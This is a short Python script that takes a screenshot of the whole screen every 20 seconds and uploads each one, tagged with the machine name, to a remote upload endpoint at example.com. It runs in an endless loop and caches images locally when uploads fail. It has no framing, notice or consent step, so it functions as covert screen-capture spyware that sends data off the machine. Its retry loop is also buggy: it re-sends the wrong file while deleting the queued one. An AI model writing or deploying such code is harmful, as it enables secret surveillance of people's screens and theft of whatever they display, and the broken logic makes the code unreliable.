import time
from pathlib import Path
import requests
import os
import mss
from PIL import Image
from io import BytesIO

COMPUTER = os.environ['COMPUTERNAME']
url = 'http://example.com/upload.php'

BASE_DIR = Path(__file__).resolve().parent

def find_files(directory, extensions):
    fu = [os.path.join(dp, f) for dp, dn, filenames in os.walk(directory) for f in filenames if os.path.splitext(f)[1].lower() in extensions]
    return fu

while True:
    timestr = time.strftime("%Y%m%d%H%M%S")
    with mss.mss() as mss_instance:
        monitor = mss_instance.monitors[0]
        screenshot = mss_instance.grab(monitor)

        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
        byte_io = BytesIO()
        img.save(byte_io, 'png')
        byte_io.seek(0)

        files={
            'pic': (
                COMPUTER + "_" + timestr + '.png',
                byte_io,
                'image/png'
            )
        }
        try:
            response = requests.post(url, files=files)
        except:
            img.save(Path(BASE_DIR, COMPUTER + "_" + timestr + '.png'), 'PNG')

    files = find_files(BASE_DIR, ['.png'])

    for filename in files:
        files = {'pic': open(Path(BASE_DIR, COMPUTER + "_" + timestr + '.png'), 'rb')}
        try:
            response = requests.post(url, files=files)
            if response.status_code == 200:
                try:
                    Path(filename).unlink()
                except:
                    pass
        except:
            pass
    time.sleep(20)